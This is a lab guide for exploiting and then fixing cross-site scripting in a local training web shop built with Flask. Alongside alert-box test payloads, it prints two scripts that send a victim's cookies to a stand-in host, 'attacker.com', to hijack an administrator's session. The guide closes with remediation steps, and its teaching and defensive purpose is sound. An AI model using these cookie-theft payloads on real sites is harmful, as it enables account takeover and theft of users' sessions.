Lab 02 — Cross-Site Scripting (XSS) Lab Guide

Application: FlaskShop E-Commerce (Python Flask)

Target URL: http://localhost:5000

Step 3: Exploitation
XSS-001: Reflected XSS

Visit: /search?q=<script>alert('XSS')</script>

/search?q=<script>alert('XSS-Reflected')</script>
/search?q=<img src=x onerror=alert('XSS')>
/search?q=<svg onload=alert(1)>
XSS-002: Stored XSS

Login, go to any product, submit a review with:

<script>alert('Stored XSS - runs for every visitor!')</script>

Everyone who views that product page will execute your script.

XSS-003: DOM-Based XSS

Visit (after logging in):

/profile#<img src=x onerror=alert('DOM-XSS')>
XSS-004: Blind XSS (steals admin session)

Submit contact form with this message (attacker would host the listener):

<script>
var img = new Image();
img.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

When admin visits /admin/contacts, their cookie is sent to attacker.

Session Hijack Payload
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
Step 4: Impact Assessment
  • Session hijacking: Attacker steals admin cookie → full admin access
  • Credential phishing: Fake login form injected into trusted site
  • Persistent malware: Stored XSS executes on every page load for all users
  • Data exfiltration: DOM storage, cookies, form data stolen
Step 5: Remediation
1. Use Jinja2 Auto-Escaping (default behavior)
# VULNERABLE:
{{ user_input | safe }}   # disables escaping!

# SECURE:
{{ user_input }}          # Jinja2 escapes by default → <script> becomes &lt;script&gt;
2. Sanitize Stored Content (bleach library)
import bleach
safe_content = bleach.clean(user_input, tags=[], attributes={}, strip=True)
3. Set Content Security Policy Header
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
4. HttpOnly Cookies
app.config['SESSION_COOKIE_HTTPONLY'] = True   # prevents JS access to cookie
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
